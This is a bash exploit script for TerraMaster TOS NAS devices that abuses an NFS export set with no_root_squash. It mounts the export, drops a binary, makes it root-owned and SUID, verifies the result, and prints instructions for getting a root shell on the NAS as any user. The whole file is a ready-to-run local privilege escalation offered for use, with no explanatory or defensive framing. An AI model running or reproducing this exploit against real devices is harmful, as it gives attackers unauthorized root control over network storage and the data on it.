#!/bin/bash
# TerraMaster TOS NFS no_root_squash LPE
# Drops a SUID-root shell on the NAS via NFS.
# Requires: sudo, aarch64-linux-gnu-gcc, nfs-common/nfs-utils
set -e

NAS="${1:?usage: sudo ./drop.sh <NAS_IP> [export_path]}"
EXPORT="${2:-}"
MNTDIR=$(mktemp -d)

cleanup() { sudo umount "$MNTDIR" 2>/dev/null; rmdir "$MNTDIR" 2>/dev/null; }
trap cleanup EXIT

# Build if needed
[ -f suid ] || make -C "$(dirname "$0")"

# Auto-detect export
if [ -z "$EXPORT" ]; then
    EXPORT=$(showmount -e "$NAS" --no-headers 2>/dev/null | head -1 | awk '{print $1}')
    [ -z "$EXPORT" ] && { echo "[!] No exports found, specify manually"; exit 1; }
    echo "[*] Export: $EXPORT"
fi

# Mount and drop
sudo mount -t nfs -o vers=3 "$NAS:$EXPORT" "$MNTDIR"
sudo cp "$(dirname "$0")/suid" "$MNTDIR/.suid"
sudo chown 0:0 "$MNTDIR/.suid"
sudo chmod 4755 "$MNTDIR/.suid"

# Verify
OWNER=$(stat -c '%u' "$MNTDIR/.suid")
MODE=$(stat -c '%a' "$MNTDIR/.suid")
if [ "$OWNER" = "0" ] && [ "$MODE" = "4755" ]; then
    echo "[+] SUID-root binary dropped at $EXPORT/.suid"
    echo ""
    echo "    On the NAS as any user:"
    echo "      $EXPORT/.suid        # root shell"
    echo "      $EXPORT/.suid id     # run a command as root"
else
    echo "[!] no_root_squash not active (owner=$OWNER mode=$MODE)"
fi
